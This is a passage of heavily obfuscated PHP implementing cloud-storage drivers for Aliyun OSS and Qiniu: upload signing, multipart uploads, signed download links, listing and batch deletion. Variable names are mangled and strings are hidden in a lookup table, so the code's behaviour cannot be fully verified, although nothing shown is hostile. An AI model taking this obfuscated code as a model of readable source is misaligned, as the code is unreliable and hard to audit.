trim($¨…ÅõêÅ, $èà ±¾Õ[8]); $”§òñø¿ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($èà ±¾Õ[1410] => @md5_file($ÒöâğÎØ)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($¨…ÅõêÅ))); $”§òñø¿ = $this->trafficLimit($èà ±¾Õ[1420], $”§òñø¿); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($ÈÈÂ…İ), $ÒöâğÎØ, $”§òñø¿); } catch (OSS\Core\OssException $•ƒ×¡ˆÅ) { return !1; } return $this->getPathOuter($¨…ÅõêÅ); } public function getHost() { $öá‹ŞÅƒ =& $_SERVER[Ó¡Ÿ§‚]; $Ñ¿øªÇŠ = explode($öá‹ŞÅƒ[184], parent::getHost()); return $Ñ¿øªÇŠ[0] . $öá‹ŞÅƒ[184] . $this->bucket . $öá‹ŞÅƒ[10] . $Ñ¿øªÇŠ[1]; } public function uploadFormData($‡Íù²Å, $§Üƒ†¯¤ = 3600) { $å®Ó™¿¿ =& $_SERVER[Ó¡Ÿ§‚]; if (!($†Ó»»ó = $this->getHost())) { return !1; } $†ëúóÁ° = $§Üƒ†¯¤; $ÜùÏ¼¦ = date($å®Ó™¿¿[1423], time() + $†ëúóÁ°); $ùìí‰‹ = new DateTime($ÜùÏ¼¦); $´ßÎÃÍš = $ùìí‰‹->format(DateTime::ISO8601); $‡ªşàò = strpos($´ßÎÃÍš, $å®Ó™¿¿[296]); $´ßÎÃÍš = substr($´ßÎÃÍš, 0, $‡ªşàò) . $å®Ó™¿¿[1424]; $ôÏÃë×¢ = 1048576000 * 5; $‘îìäóÂ = $this->pathFather($‡Íù²Å); $‡£ÅÍ‘» = array($å®Ó™¿¿[1323] => $´ßÎÃÍš, $å®Ó™¿¿[1324] => array(array($å®Ó™¿¿[1425], 0, $ôÏÃë×¢), array($å®Ó™¿¿[1327], $å®Ó™¿¿[1328], $‘îìäóÂ))); $Û÷§…œÓ = base64_encode(json_encode($‡£ÅÍ‘»)); $©·æ¤Ãñ = base64_encode(hash_hmac($å®Ó™¿¿[232], $Û÷§…œÓ, $this->secret, !0)); $ôÃÚ½³â = array($å®Ó™¿¿[1333] => $Û÷§…œÓ, $å®Ó™¿¿[1426] => $this->accessKey, $å®Ó™¿¿[1329] => $å®Ó™¿¿[1321], $å®Ó™¿¿[1427] => $©·æ¤Ãñ, $å®Ó™¿¿[182] => $†Ó»»ó); $ôÃÚ½³â = $this->trafficLimit($å®Ó™¿¿[1420], $ôÃÚ½³â); return $ôÃÚ½³â; } public function multiUploadFormData($Ò¡–Îë, $ìûìÃï× = 3600) { $Ä«˜œ¸ =& $_SERVER[Ó¡Ÿ§‚]; if (!($ª’«œ˜Ä = $this->getHost())) { return !1; } $ÒÚï®Ô = $this->trafficLimit($Ä«˜œ¸[1420]); $ÈÌ¤ü¹Ö = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($Ò¡–Îë), $ÒÚï®Ô); return array($Ä«˜œ¸[223] => $ÈÌ¤ü¹Ö, $Ä«˜œ¸[182] => $ª’«œ˜Ä . $Ä«˜œ¸[8] . $this->pathEncode($Ò¡–Îë), $Ä«˜œ¸[224] => gmdate($Ä«˜œ¸[1428]), $Ä«˜œ¸[94] => $Ò¡–Îë); } public function multiUploadAuthData($™ê¢ÀÃ, $§å•çÊ· = array()) { $«›¹Í‘¯ =& $_SERVER[Ó¡Ÿ§‚]; $®Éò´ø… = isset($§å•çÊ·[$«›¹Í‘¯[224]]) ? $§å•çÊ·[$«›¹Í‘¯[224]] : gmdate($«›¹Í‘¯[1428]); $ö¢ Òü  = isset($§å•çÊ·[$«›¹Í‘¯[174]]) ? $§å•çÊ·[$«›¹Í‘¯[174]] : $«›¹Í‘¯[12]; $Êå÷çş­ = $™ê¢ÀÃ; if (isset($§å•çÊ·[$«›¹Í‘¯[94]])) { $Êå÷çş­ = $§å•çÊ·[$«›¹Í‘¯[94]]; unset($§å•çÊ·[$«›¹Í‘¯[94]]); } if (isset($§å•çÊ·[$«›¹Í‘¯[225]])) { $§å•çÊ·[$«›¹Í‘¯[224]] = $®Éò´ø…; return $this->listUploadParts($Êå÷çş­, $§å•çÊ·); } $–Ïå‡Ş§ = array($«›¹Í‘¯[226], $«›¹Í‘¯[12], $«›¹Í‘¯[120], $®Éò´ø…, "\170\x2d\x6f\x73\x73\x2d\x64\141\164\145\x3a{$®Éò´ø…}", $«›¹Í‘¯[8] . $this->bucket . $«›¹Í‘¯[8] . $Êå÷çş­ . $ö¢ Òü ); if (strpos($ö¢ Òü , $«›¹Í‘¯[227]) === 0) { $–Ïå‡Ş§[0] = $«›¹Í‘¯[228]; if ($¡‘•¸±ú = $this->trafficLimit($«›¹Í‘¯[1420])) { $Êå÷çş­ = $«›¹Í‘¯[1429]; array_splice($–Ïå‡Ş§, 5, 0, $Êå÷çş­ . $«›¹Í‘¯[4] . $¡‘•¸±ú[$Êå÷çş­]); } } if (isset($§å•çÊ·[$«›¹Í‘¯[229]]) && $§å•çÊ·[$«›¹Í‘¯[229]] == $«›¹Í‘¯[230]) { $–Ïå‡Ş§[0] = $«›¹Í‘¯[230]; } if (!empty($§å•çÊ·[$«›¹Í‘¯[1430]])) { $–ÜÛÅ·ì = array_merge(array($–Ïå‡Ş§[4]), $§å•çÊ·[$«›¹Í‘¯[1430]]); sort($–ÜÛÅ·ì); $–Ïå‡Ş§[4] = implode($«›¹Í‘¯[231], $–ÜÛÅ·ì); } $à¾Œ™§˜ = implode($«›¹Í‘¯[231], $–Ïå‡Ş§); $†‰Êô = base64_encode(hash_hmac($«›¹Í‘¯[232], $à¾Œ™§˜, $this->secret, !0)); $ê˜Ã œ— = $«›¹Í‘¯[1394] . $this->accessKey . $«›¹Í‘¯[4] . $†‰Êô; if (strpos($ö¢ Òü , $«›¹Í‘¯[227]) === 0) { $ê˜Ã œ— = array($«›¹Í‘¯[234] => $ê˜Ã œ—, $«›¹Í‘¯[224] => $®Éò´ø…); if ($¡‘•¸±ú) { $ê˜Ã œ— = array_merge($ê˜Ã œ—, $¡‘•¸±ú); } } return $ê˜Ã œ—; } public function listUploadParts($¼Âñ˜æÏ, $æ»³à´) { $¨†­èãõ =& $_SERVER[Ó¡Ÿ§‚]; $»°Ë–Êœ = parse_url_query($æ»³à´[$¨†­èãõ[174]]); $®Œ¢åë· = $this->client->listParts($this->bucket, $this->pathEncode($¼Âñ˜æÏ), $»°Ë–Êœ[$¨†­èãõ[223]]); $›¨µß€ı = $®Œ¢åë·->getListPart(); $Ğá˜˜¶˜ = array(); foreach ($›¨µß€ı as $ƒŒªºù‚) { $Ğá˜˜¶˜[] = array($¨†­èãõ[1414] => $ƒŒªºù‚->getPartNumber(), $¨†­èãõ[1415] => trim($ƒŒªºù‚->getETag(), $¨†­èãõ[118])); } unset($æ»³à´[$¨†­èãõ[225]], $æ»³à´[$¨†­èãõ[229]]); $À€ùëĞ = $this->multiUploadAuthData($¼Âñ˜æÏ, $æ»³à´); if (empty($À€ùëĞ)) { return !1; } return array($¨†­èãõ[234] => $À€ùëĞ, $¨†­èãõ[224] => $æ»³à´[$¨†­èãõ[224]], $¨†­èãõ[236] => $Ğá˜˜¶˜); } public function download($§î·îĞ«, $ÁÛü»¾×) { if ($this->isFolder($§î·îĞ«)) { return !1; } try { $¡§Ö­Ãù = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $ÁÛü»¾×); $¡§Ö­Ãù = $this->trafficLimit($_SERVER[Ó¡Ÿ§‚][109], $¡§Ö­Ãù); $this->client->getObject($this->bucket, $this->pathEncode($§î·îĞ«), $¡§Ö­Ãù); } catch (OSS\Core\OssException $‘ÄóÒ…) { return !1; } return $ÁÛü»¾×; } public function fileSubstr($ÇÖâÂõö, $úÖôæ‚ = 0, $å²òô†ë = false) { if ($úÖôæ‚ === -1) { $ÎÖÀšä = array(); } else { if ($å²òô†ë === !1) { $Ôó¶çåş = $this->size($ÇÖâÂõö); } else { $Ôó¶çåş = $úÖôæ‚ + $å²òô†ë - 1; } $ÎÖÀšä = array(OSS\OssClient::OSS_RANGE => "{$úÖôæ‚}\x2d{$Ôó¶çåş}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($ÇÖâÂõö), $ÎÖÀšä); } catch (OSS\Core\OssException $Í›Ó½¤ñ) { think_exception($Í›Ó½¤ñ->getMessage()); return !1; } } private function trafficLimit($ğòªÊµ, $–¯º€¬ = array()) { $ƒ÷¥‡Êã =& $_SERVER[Ó¡Ÿ§‚]; if ($ğòªÊµ == $ƒ÷¥‡Êã[1420] && $this->isUploadServer() || $ğòªÊµ == $ƒ÷¥‡Êã[109] && $this->isFileOutServer()) { return $–¯º€¬; } $ÒòÊÛØ¼ = floatval($GLOBALS[$ƒ÷¥‡Êã[6]][$ƒ÷¥‡Êã[89]][$ƒ÷¥‡Êã[107]][$ğòªÊµ]) * 1024 * 1024 * 8; if (!$ÒòÊÛØ¼) { return $–¯º€¬; } $ÒòÊÛØ¼ = $ÒòÊÛØ¼ < 819200 ? 819200 : ($ÒòÊÛØ¼ > 838860800 ? 838860800 : $ÒòÊÛØ¼); $–¯º€¬[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($ÒòÊÛØ¼); return $–¯º€¬; } public function link($º‡“†, $ùÙ®†ß¿ = array()) { $—²¥Í¤˜ =& $_SERVER[Ó¡Ÿ§‚]; if (!$this->exist($º‡“†) || $this->isFolder($º‡“†)) { return !1; } try { $ùÙ®†ß¿ = $this->trafficLimit($—²¥Í¤˜[109], $ùÙ®†ß¿); $Ï”»Ì‰ç = $this->client->signUrl($this->bucket, $this->pathEncode($º‡“†), 3600 * 12, $—²¥Í¤˜[230], $ùÙ®†ß¿); return $this->getCdnLink($Ï”»Ì‰ç); } catch (OSS\Core\OssException $½İÍôı») { return !1; } } public function fileOut($Ÿù×¶äû, $¿•Âî¤ = false, $¶õæ²® = false, $µÔ†ù‡Ô = '') { $ª‚‡÷Â× =& $_SERVER[Ó¡Ÿ§‚]; if ($this->isFileOutServer()) { return $this->fileOutServer($Ÿù×¶äû, $¿•Âî¤, $¶õæ²®, $µÔ†ù‡Ô); } if (!$¶õæ²®) { $¶õæ²® = $this->pathThis($Ÿù×¶äû); } $¶õæ²® = rawurlencode($¶õæ²®); $äÒœ°¸‹ = get_file_mime(get_path_ext($¶õæ²®)); if ($äÒœ°¸‹ == $ª‚‡÷Â×[217]) { return parent::fileOut($Ÿù×¶äû, $¿•Âî¤, $¶õæ²®, $µÔ†ù‡Ô); } $¿•Âî¤ = $¿•Âî¤ ? $ª‚‡÷Â×[1431] : $ª‚‡÷Â×[1432]; $×¾ú¦¤œ = array(OSS\OssClient::OSS_SUB_RESOURCE => $ª‚‡÷Â×[1433] . rawurlencode("{$¿•Âî¤}\73\x66\x69\154\145\156\x61\x6d\145\75{$¶õæ²®}")); $×¾ú¦¤œ[OSS\OssClient::OSS_SUB_RESOURCE] .= $ª‚‡÷Â×[1434] . rawurlencode($äÒœ°¸‹); $à€¢¢„Ü = $this->link($Ÿù×¶äû, $×¾ú¦¤œ); $this->fileOutLink($à€¢¢„Ü); } public function fileOutServer($×µç“ú, $åƒÕ¯ƒ = false, $òÂ–ç°ê = false, $î¬»ÖÃ€ = '') { parent::fileOut($×µç“ú, $åƒÕ¯ƒ, $òÂ–ç°ê, $î¬»ÖÃ€); } public function fileOutImage($¸óÛ¾ôò, $ş»ó£å… = 250) { $æ‚ÇÀ¾µ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[Ó¡Ÿ§‚][1435] . $ş»ó£å…); $‡®ã€ÃÃ = $this->link($¸óÛ¾ôò, $æ‚ÇÀ¾µ); $this->fileOutLink($‡®ã€ÃÃ); } public function fileOutImageServer($úİËí¢, $ş¼Ú§Ï = 250) { parent::fileOutImage($úİËí¢, $ş¼Ú§Ï); } public function fileOutLink($Â©ûõƒº) { $µ…®®Óï =& $_SERVER[Ó¡Ÿ§‚]; if (!$this->isCdnHost() && substr($Â©ûõƒº, 0, 7) == $µ…®®Óï[1336]) { $Â©ûõƒº = $µ…®®Óï[1337] . substr($Â©ûõƒº, 7); } header($µ…®®Óï[161] . $Â©ûõƒº); die; } public function hashMd5($Ï“ŞÁĞâ, $îã÷µ‘ = '') { $½ˆÃÄ±É =& $_SERVER[Ó¡Ÿ§‚]; $şÂ×œÅ = $this->_objectMeta($Ï“ŞÁĞâ); if (!$şÂ×œÅ) { return $½ˆÃÄ±É[12]; } if (!isset($şÂ×œÅ[$½ˆÃÄ±É[1410]]) && !empty($îã÷µ‘)) { $—îÈÉ¾“ = $this->updateObjMeta($Ï“ŞÁĞâ, array($½ˆÃÄ±É[1410] => $îã÷µ‘)); $şÂ×œÅ[$½ˆÃÄ±É[1410]] = $—îÈÉ¾“ ? $îã÷µ‘ : $½ˆÃÄ±É[12]; } return isset($şÂ×œÅ[$½ˆÃÄ±É[1410]]) ? strtolower($şÂ×œÅ[$½ˆÃÄ±É[1410]]) : $½ˆÃÄ±É[12]; } public function size($á¼å¨Š) { $Ğç‹Öì¤ = $this->objectMeta($á¼å¨Š); return $Ğç‹Öì¤ ? $Ğç‹Öì¤[$_SERVER[Ó¡Ÿ§‚][76]] : 0; } public function info($£×Ş‘ÌÙ) { if ($this->isFolder($£×Ş‘ÌÙ)) { return $this->folderInfo($£×Ş‘ÌÙ); } else { if ($this->isFile($£×Ş‘ÌÙ)) { return $this->fileInfo($£×Ş‘ÌÙ); } } return !1; } public function exist($’Ö¥şªÒ) { return $this->isFile($’Ö¥şªÒ) || $this->isFolder($’Ö¥şªÒ); } public function isFile($»¾¿À°ó) { return !$this->isFolder($»¾¿À°ó) && $this->objectMeta($»¾¿À°ó); } public function isFolder($˜ÓÕêÃŸ) { return $this->cacheMethod($_SERVER[Ó¡Ÿ§‚][165], $˜ÓÕêÃŸ); } protected function objectMeta($ÉµÕ…Ñ·) { return $this->cacheMethod($_SERVER[Ó¡Ÿ§‚][167], $ÉµÕ…Ñ·); } protected function _objectMeta($‚ƒÂĞï) { $ù”€ë¼ò =& $_SERVER[Ó¡Ÿ§‚]; try { $îŸÃ×Ä = $this->client->getObjectMeta($this->bucket, $this->pathEncode($‚ƒÂĞï)); } catch (OSS\Core\OssException $îÏªÕ°Ø) { $îŸÃ×Ä = !1; } if ($îŸÃ×Ä) { $îŸÃ×Ä[$ù”€ë¼ò[76]] = intval($îŸÃ×Ä[$ù”€ë¼ò[1408]]); } return $îŸÃ×Ä; } protected function _isFolder($£ßÁ„¥) { $ÆÑşÜßŠ =& $_SERVER[Ó¡Ÿ§‚]; if ($£ßÁ„¥ == $ÆÑşÜßŠ[12] || $£ßÁ„¥ == $ÆÑşÜßŠ[8]) { return !0; } $£ïıÏ˜ = array($ÆÑşÜßŠ[1404] => $ÆÑşÜßŠ[8], $ÆÑşÜßŠ[1405] => rtrim($£ßÁ„¥, $ÆÑşÜßŠ[8]) . $ÆÑşÜßŠ[8], $ÆÑşÜßŠ[1406] => 1, $ÆÑşÜßŠ[1407] => $ÆÑşÜßŠ[12]); $ÕŞ¸…ãÍ = $this->client->listObjects($this->bucket, $£ïıÏ˜); if ($ÕŞ¸…ãÍ->getObjectList() || $ÕŞ¸…ãÍ->getPrefixList()) { return !0; } return !1; } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public $config = array(); public function __construct($…´Õ­ç) { parent::__construct(); require_once SDK_DIR . $_SERVER[Ó¡Ÿ§‚][1436]; $this->_init($…´Õ­ç); } public function _init($¼€ş­ä’) { $® ÁÂÙ’ =& $_SERVER[Ó¡Ÿ§‚]; $this->config = $¼€ş­ä’; foreach ($¼€ş­ä’ as $Âö¢õÍø => $£ÜÇòôè) { if (isset($this->{$Âö¢õÍø})) { $this->{$Âö¢õÍø} = $£ÜÇòôè; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($® ÁÂÙ’[1437] . LNG($® ÁÂÙ’[1395])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($Ã’ÜÒÛ¼, $«Ìø…ô = '', $àØÄşòİ = REPEAT_RENAME) { if ($this->setContent($Ã’ÜÒÛ¼, $«Ìø…ô)) { return $this->getPathOuter($Ã’ÜÒÛ¼); } return !1; } public function mkdir($Ã²ı‹‘, $µıÛ‚ = REPEAT_SKIP) { $ÏÁ ¼– =& $_SERVER[Ó¡Ÿ§‚]; $ü¯°ÚÅØ = trim($Ã²ı‹‘, $ÏÁ ¼–[8]); if ($this->_isFolder($ü¯°ÚÅØ)) { return $this->getPathOuter($ü¯°ÚÅØ); } $Ã²ı‹‘ = $ü¯°ÚÅØ . $ÏÁ ¼–[8]; $Ÿœ¦ô¼° = get_path_this($ü¯°ÚÅØ); $Áº×ƒ·‹ = $Ã²ı‹‘ . $Ÿœ¦ô¼°; if (!$this->mkfile($Áº×ƒ·‹)) { return !1; } if (!$this->moveFile($Áº×ƒ·‹, $Ã²ı‹‘)) { $this->delFile($Áº×ƒ·‹); return !1; } return $this->getPathOuter($ü¯°ÚÅØ); } public function copyFile($ùûÕ®¹ì, $ˆÎ¦Â…) { $ÙßàõÃı = $this->bucketManager->copy($this->bucket, $ùûÕ®¹ì, $this->bucket, $ˆÎ¦Â…, !0); return $ÙßàõÃı ? !1 : $this->getPathOuter($ˆÎ¦Â…); } public function moveFile($±òø ºÂ, $¿İŸ†å¼) { $Ê†ûĞ° = $this->bucketManager->move($this->bucket, $±òø ºÂ, $this->bucket, $¿İŸ†å¼, !0); return $Ê†ûĞ° ? !1 : $this->getPathOuter($¿İŸ†å¼); } public function delFile($½ûü²‹) { if (!$this->exist($½ûü²‹)) { return !0; } $Ïîç„À› = $this->bucketManager->delete($this->bucket, $½ûü²‹); return $Ïîç„À› ? !1 : !0; } public function delFolder($º¢Éšõ”) { $ĞÙº¹´² =& $_SERVER[Ó¡Ÿ§‚]; if (!$this->exist($º¢Éšõ”)) { return !0; } $this->listItemCache = !1; $¡Ïºœü = $this->fileList($º¢Éšõ”); $this->listItemCache = !0; $Ö‹õÑüÒ = trim($º¢Éšõ”, $ĞÙº¹´²[8]) . $ĞÙº¹´²[8]; if (!empty($º¢Éšõ”) && $º¢Éšõ” !== $ĞÙº¹´²[198] && !in_array($Ö‹õÑüÒ, $¡Ïºœü[$ĞÙº¹´²[82]])) { $¡Ïºœü[$ĞÙº¹´²[82]][] = $Ö‹õÑüÒ; } $ûÛşşô = $this->delByBatch($¡Ïºœü[$ĞÙº¹´²[83]]); if (!$ûÛşşô) { return !1; } $ûÛşşô = $this->delByBatch($¡Ïºœü[$ĞÙº¹´²[82]]); if (!$ûÛşşô) { return !1; } return $this->delFile($Ö‹õÑüÒ); } private function delByBatch($áá›ÌÛú) { foreach (array_chunk($áá›ÌÛú, 1000) as $Àé‹é©Æ) { $Å£¯ø‹È = $this->bucketManager->buildBatchDelete($this->bucket, $Àé‹é©Æ); list($Ä¹§ç†ä, $ÒÒ½ÊĞ²) = $this->bucketManager->batch($Å£¯ø‹È); if ($ÒÒ½ÊĞ²) { return !1; } } return !0; } public function rename($µªÆŒÏ™, $•íÙù±è) { return $this->renameObject($µªÆŒÏ™, $•íÙù±è); } public function fileInfo($«şì¢Æ, $ãéºàü = false, $À£ğŠğí = array()) { $Àü’æÔ =& $_SERVER[Ó¡Ÿ§‚]; $î© †ü = array($Àü’æÔ[32] => $this->pathThis($«şì¢Æ), $Àü’æÔ[84] => $this->getPathOuter($Àü’æÔ[8] . $«şì¢Æ), $Àü’æÔ[33] => $Àü’æÔ[200], $Àü’æÔ[76] => isset($À£ğŠğí[$Àü’æÔ[1438]]) ? $À£ğŠğí[$Àü’æÔ[1438]] : 0, $Àü’æÔ[174] => $this->ext($«şì¢Æ)); if ($ãéºàü) { return $î© †ü; } $î© †ü[$Àü’æÔ[201]] = $î© †ü[$Àü’æÔ[85]] = 0; $î© †ü[$Àü’æÔ[202]] = $î© †ü[$Àü’æÔ[203]] = !0; if (empty($À£ğŠğí)) { $À£ğŠğí = $this->objectMeta($«şì¢Æ); if (!$À£ğŠğí) { return $î© †ü; } } if (isset($À£ğŠğí[$Àü’æÔ[1439]])) { $î© †ü[$Àü’æÔ[85]] = substr($À£ğŠğí[$Àü’æÔ[1439]] . $Àü’æÔ[12], 0, 10); } if (isset($À£ğŠğí[$Àü’æÔ[1438]])) { $î© †ü[$Àü’æÔ[76]] = $À£ğŠğí[$Àü’æÔ[1438]]; } return $î© †ü; } public function folderInfo($ù›üœ¾š, $¿ĞÏ•·¡ = false) { $÷ ¸Å¡ =& $_SERVER[Ó¡Ÿ§‚]; $´—½ı€ø = array($÷ ¸Å¡[32] => $this->pathThis($ù›üœ¾š), $÷ ¸Å¡[84] => $this->getPathOuter($÷ ¸Å¡[8] . $ù›üœ¾š), $÷ ¸Å¡[33] => $÷ ¸Å¡[75]); if ($¿ĞÏ•·¡) { return $´—½ı€ø; } $´—½ı€ø[$÷ ¸Å¡[201]] = $´—½ı€ø[$÷ ¸Å¡[85]] = 0; $´—½ı€ø[$÷ ¸Å¡[202]] = $´—½ı€ø[$÷ ¸Å¡[203]] = !0; $ù›üœ¾š = rtrim($ù›üœ¾š, $÷ ¸Å¡[8]) . $÷ ¸Å¡[8]; $¶•‹ğü¼ = $this->objectMeta($ù›üœ¾š); if (isset($¶•‹ğü¼[$÷ ¸Å¡[1439]])) { $´—½ı€ø[$÷ ¸Å¡[85]] = substr($¶•‹ğü¼[$÷ ¸Å¡[1439]] . $÷ ¸Å¡[12], 0, 10); } return $´—½ı€ø; } public function listPath($òãË­®ò, $‰¨€Õ‰ = false) { $ª£óÅ¥Ğ =& $_SERVER[Ó¡Ÿ§‚]; $Ä¶ïˆÜÆ = $this->fileList($òãË­®ò, $ª£óÅ¥Ğ[8], !0); foreach ($Ä¶ïˆÜÆ[$ª£óÅ¥Ğ[82]] as $è—ü¶±Ÿ => $ÃÍ™‘ò¶) { $Ä¶ïˆÜÆ[$ª£óÅ¥Ğ[82]][$è—ü¶±Ÿ] = $this->folderInfo($ÃÍ™‘ò¶, $‰¨€Õ‰); } foreach ($Ä¶ïˆÜÆ[$ª£óÅ¥Ğ[83]] as $è—ü¶±Ÿ => $ÃÍ™‘ò¶) { $Ä¶ïˆÜÆ[$ª£óÅ¥Ğ[83]][$è—ü¶±Ÿ] = $this->fileInfo($ÃÍ™‘ò¶[$ª£óÅ¥Ğ[94]], $‰¨€Õ‰, $ÃÍ™‘ò¶); } return $Ä¶ïˆÜÆ; } public function has($ôÁÖìòã, $ˆÓ«ÌËÄ = false, $Šßš§ù€ = true) { $ª««©ƒí =& $_SERVER[Ó¡Ÿ§‚]; $ôÁÖìòã = trim($ôÁÖìòã, $ª««©ƒí[8]); $ÁÆü§ö€ = empty($ôÁÖìòã) && $ôÁÖìòã !== $ª««©ƒí[198] ? $ª««©ƒí[12] : $ôÁÖìòã . $ª««©ƒí[8]; $àŠã”¼Î = $ª««©ƒí[12]; $ë©ø¬¨» = 500; $ı¢ÄØ¯Ç = $ª««©ƒí[8]; $„íÖÜœ = $ùí”ú»Ø = 0; while (!0) { check_abort(); list($â¡şš“, $ß æâÔŒ) = $this->bucketManager->listFiles($this->bucket, $ÁÆü§ö€, $àŠã”¼Î, $ë©ø¬¨», $ı¢ÄØ¯Ç); if ($ß æâÔŒ) { break; } $àŠã”¼Î = array_key_exists($ª««©ƒí[1407], $â¡şš“) ? $àŠã”¼Î = $â¡şš“[$ª««©ƒí[1440]] : $ª««©ƒí[12]; if ($ˆÓ«ÌËÄ) { if (!empty($â¡şš“[$ª««©ƒí[1441]])) { $„íÖÜœ += count($â¡şš“[$ª««©ƒí[1441]]); } if (!empty($â¡şš“[$ª««©ƒí[1442]])) { $ùí”ú»Ø += count($â¡şš“[$ª««©ƒí[1442]]); } if ($àŠã”¼Î === $ª««©ƒí[12]) { break; } continue; } if ($Šßš§ù€) { if (!empty($â¡şš“[$ª««©ƒí[1441]])) { return !0; } } else { if (!empty($â¡şš“[$ª««©ƒí[1442]])) { return !0; } } if ($àŠã”¼Î === $ª««©ƒí[12]) { break; } } if ($ˆÓ«ÌËÄ) { return array($ª««©ƒí[207] => $„íÖÜœ, $ª««©ƒí[208] => $ùí”ú»Ø); } return !1; } public function listAll($‡¼»Ê”Ú) { $ÊÑ€²âÁ =& $_SERVER[Ó¡Ÿ§‚]; $©¹Ù„Ê = $this->fileList($‡¼»Ê”Ú, $ÊÑ€²âÁ[12], !0); $‡èˆ÷· = array_to_keyvalue($©¹Ù„Ê[$ÊÑ€²âÁ[83]], $ÊÑ€²âÁ[32]); foreach ($©¹Ù„Ê[$ÊÑ€²âÁ[82]] as $ ¹äùè¿) { if (is_string($ ¹äùè¿)) { $‡èˆ÷·[$ ¹äùè¿] = array($ÊÑ€²âÁ[76] => 0); } } return $this->listAllFiles($‡¼»Ê”Ú, $‡èˆ÷·); } private function fileList($ÂˆÃôºì, $Ë®éÈ³ = '', $‰ÏÕ¯Ñê = 0) { $ÉšŞøÛ¬ =& $_SERVER[Ó¡Ÿ§‚]; $ÂˆÃôºì = trim($ÂˆÃôºì, $ÉšŞøÛ¬[8]); $àáîÌªÚ = empty($ÂˆÃôºì) && $ÂˆÃôºì !== $ÉšŞøÛ¬[198] ? $ÉšŞøÛ¬[12] : $ÂˆÃôºì . $ÉšŞøÛ¬[8]; $ÛØÎ–¥À = $ÉšŞøÛ¬[12]; $·íÂ‘‰• = 1000; $–ôŒÔÚ¢ = $Ã´İ÷’ = array(); while (!0) { check_abort(); list($×ãÍ¬¥, $ö†€ïé) = $this->bucketManager->listFiles($this->bucket, $àáîÌªÚ, $ÛØÎ–¥À, $·íÂ‘‰•, $Ë®éÈ³); if ($ö†€ïé) { break; } $ÛØÎ–¥À = array_key_exists($ÉšŞøÛ¬[1407], $×ãÍ¬¥) ? $ÛØÎ–¥À = $×ãÍ¬¥[$ÉšŞøÛ¬[1440]] : $ÉšŞøÛ¬[12]; $ò®Ûƒ = isset($×ãÍ¬¥[$ÉšŞøÛ¬[1441]]) ? $×ãÍ¬¥[$ÉšŞøÛ¬[1441]] : array(); $ÕÀÙç”… = isset($×ãÍ¬¥[$ÉšŞøÛ¬[1442]]) ? $×ãÍ¬¥[$ÉšŞøÛ¬[1442]] : array(); foreach ($ò®Ûƒ as $óªæñâ) { if ($óªæñâ[$ÉšŞøÛ¬[94]] == $àáîÌªÚ) { continue; } $¦¬¤¸Öñ = $óªæñâ[$ÉšŞøÛ¬[94]]; $¼¡¹§« = $óªæñâ[$ÉšŞøÛ¬[1438]]; $óªæñâ[$ÉšŞøÛ¬[76]] = $¼¡¹§«; $şæÕ¢ÑÕ = $¼¡¹§« == 0 && substr($¦¬¤¸Öñ, strlen($¦¬¤¸Öñ) - 1, 1) == $ÉšŞøÛ¬[8] ? !0 : !1; $this->cacheMethodInfoSet($¦¬¤¸Öñ, $şæÕ¢ÑÕ, $óªæñâ); if ($şæÕ¢ÑÕ) { $–ôŒÔÚ¢[] = $¦¬¤¸Öñ; continue; } $Ã´İ÷’[] = $‰ÏÕ¯Ñê ? $óªæñâ : $¦¬¤¸Öñ; } foreach ($ÕÀÙç”… as $¦¬¤¸Öñ) { if ($¦¬¤¸Öñ == $àáîÌªÚ) { continue; } $–ôŒÔÚ¢[] = $¦¬¤¸Öñ; $this->cacheMethodInfoSet($¦¬¤¸Öñ, !0); } if ($ÛØÎ–¥À === $ÉšŞøÛ¬[12]) { break; } } $this->cacheMethodInfoSet($ÂˆÃôºì, !0); return array($ÉšŞøÛ¬[82] => $–ôŒÔÚ¢, $ÉšŞøÛ¬[83] => $Ã´İ÷’); } public function canRead($€ˆ¯ªƒ‰) { return $this->exist($€ˆ¯ªƒ‰) ? !0 : !1; } public function canWrite($•ú–¤Ø) { return $this->exist($•ú–¤Ø) ? !0 : !1; } public function getContent($ŒãùŒ¿Û) { return $this->fileSubstr($ŒãùŒ¿Û, 0, -1); } public function setContent($Úö¯Éğø, $½—âšáä = '') { $ØŸúÊ = $this->tempFile($this->pathThis($Úö¯Éğø)); file_put_contents($ØŸúÊ, $½—âšáä); if ($this->upload($Úö¯Éğø, $ØŸúÊ)) { $this->tempFileRemve($ØŸúÊ); return !0; } return !1; } public function refreshUrls($§‚ÚÊ…¢) { $Ú²èšÊ =& $_SERVER[Ó¡Ÿ§‚]; $ö¤ßÏ = array(); if (is_array($§‚ÚÊ…¢)) { foreach ($§‚ÚÊ…¢ as $€œ‹ÇûÖ) { $ö¤ßÏ[] = $this->link($€œ‹ÇûÖ); } } else { $ö¤ßÏ[] = $this->link($§‚ÚÊ…¢); } $œ¶Ş¯‚ = new Qiniu\Cdn\CdnManager($this->auth); list($Ã¸Š†…Š, $Àï·Âéì) = $œ¶Ş¯‚->refreshUrls($ö¤ßÏ); if ($Àï·Âéì) { return !1; } return $Ã¸Š†…Š[$Ú²èšÊ[1181]] == $Ú²èšÊ[758] ? !0 : !1; } public function fileSubstr($Úé¸’Îˆ, $Ëù»®Õì, $œ¼Îˆ·“) { $Ú»¸»š =& $_SERVER[Ó¡Ÿ§‚]; if (!($äŒŞã²ù = $this->link($Úé¸’Îˆ))) { return !1; } $°¿è¬ğŞ = !1; if 